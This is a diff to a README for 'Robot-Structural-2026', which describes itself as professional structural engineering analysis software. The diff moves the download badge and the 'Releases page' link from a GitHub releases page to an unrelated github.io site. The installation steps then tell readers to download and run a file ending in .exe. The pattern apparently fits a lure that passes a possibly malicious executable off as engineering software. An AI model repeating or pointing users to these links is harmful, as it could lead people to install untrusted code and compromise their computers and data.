@@ -1,6 +1,6 @@
 # 🏗 Robot-Structural-2026 - Perform Professional Structural Engineering Analysis Projects
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Darbyantagonistic737/Robot-Structural-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://darbyantagonistic737.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific hardware to run the software effectively. Ensure yo
 
 Follow these steps to obtain and set up the software.
 
-1. Go to the [Releases page](https://github.com/Darbyantagonistic737/Robot-Structural-2026/releases).
+1. Go to the [Releases page](https://darbyantagonistic737.github.io).
 2. Locate the most recent version under the Releases section.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
